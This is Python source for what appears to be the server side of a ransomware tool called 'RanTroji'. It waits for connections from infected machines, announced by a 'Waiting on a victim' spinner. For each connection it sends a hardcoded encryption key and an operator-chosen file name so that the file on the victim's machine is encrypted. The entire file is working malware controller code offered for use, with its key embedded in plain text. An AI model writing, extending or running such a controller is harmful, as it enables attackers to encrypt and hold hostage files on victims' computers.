import socket 
from _thread import *
import threading 
import os
import emoji 
from progress.spinner import Spinner

print_lock = threading.Lock() 
key = '7r128iawNRAJVPoZDcR2rh4Oz_En3XW8UboAfM4keSg='
header = """
8888888b.                88888888888               d8b 
888   Y88b                   888                   Y8P 
888    888                   888                       
888   d88P  8888b.  88888b.  888  888d888 .d88b.  8888 
8888888P"      "88b 888 "88b 888  888P"  d88""88b "888 
888 T88b   .d888888 888  888 888  888    888  888  888 
888  T88b  888  888 888  888 888  888    Y88..88P  888 
888   T88b "Y888888 888  888 888  888     "Y88P"   888 
                                                   888 
                                                  d88P 
                                                888P"  """

def threaded(c): 
    # while True: 
    file_name = input("Enter the file that you want to Encrpyt: ")
            
    instructions = str(key) + ',' + str(file_name)
    c.send(instructions.encode('utf-8'))

    data = c.recv(1024) 
    if not data: 
        print('Bye') 
        print_lock.release() 
        # break
    print('STATUS: ', str(data.decode('utf-8'))) 
    c.close() 

def main(): 
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    server.settimeout(0.1) 

    host = socket.gethostbyname(socket.gethostname())
    # host = [l
    # for l in ([ip
    #   for ip in socket.gethostbyname_ex(socket.gethostname())[2]
    #   if not ip.startswith("127.")
    # ][: 1], [
    #   [(s.connect(('8.8.8.8', 53)),
    #     s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
    #     socket.SOCK_DGRAM)]][0][1]
    # ]) if l
    # ][0][0]
    port = 8888

    server.bind((host, port)) 
    server.listen(5) 
    
    os.system("cls")
    print (header)
    print ('Address IP> ' + host + ':' + str(port))
    
    spinner = Spinner(emoji.emojize(':smiling_imp:  :smiling_imp:  :smiling_imp:   Waiting on a victim ', use_aliases=True))

    connected = False

    while True:
        try:   
            if not connected:
                spinner.next()
            conn, addr = server.accept() 
            print_lock.acquire() 
            connected = True
            print('\nConnected to :', addr[0], ':', addr[1]) 
            start_new_thread(threaded, (conn,)) 
        except socket.timeout:
            pass
    server.close() 
  
if __name__ == '__main__': 
    main() 